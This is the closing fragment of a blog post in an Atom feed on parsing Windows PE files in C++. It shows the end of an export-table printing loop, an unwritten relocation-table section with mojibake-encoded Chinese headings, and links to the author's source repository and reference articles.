class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt;<span class="string">&quot;-----------------------------------&quot;</span>&lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        szFunction = szFunction + <span class="built_in">strlen</span>(szFunction) + <span class="number">1</span>;</span><br><span class="line">        ppdwAddr++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/PE/27.png" alt="image-20200713220649317"></p><h4 id="è·å–é‡å®šä½è¡¨"><a href="#è·å–é‡å®šä½è¡¨" class="headerlink" title="è·å–é‡å®šä½è¡¨"></a>è·å–é‡å®šä½è¡¨</h4><p>è¿™ä¸ªå¥½åƒç”¨å¤„ä¸å¤§ï¼Œåˆ°æ—¶å€™æœ‰æ—¶é—´å†™ï¼Œæ²¡æ—¶é—´å°±ç®—äº†</p><h4 id="æ–‡ç« ç”¨åˆ°çš„æºç "><a href="#æ–‡ç« ç”¨åˆ°çš„æºç " class="headerlink" title="æ–‡ç« ç”¨åˆ°çš„æºç "></a>æ–‡ç« ç”¨åˆ°çš„æºç </h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Ascotbe&#x2F;virus&#x2F;tree&#x2F;master&#x2F;PortableExecutableParser</span><br></pre></td></tr></table></figure><h4 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.cppblog.com&#x2F;API&#x2F;archive&#x2F;2011&#x2F;03&#x2F;09&#x2F;141423.html</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;LyShark&#x2F;p&#x2F;11748296.html</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
</feed>
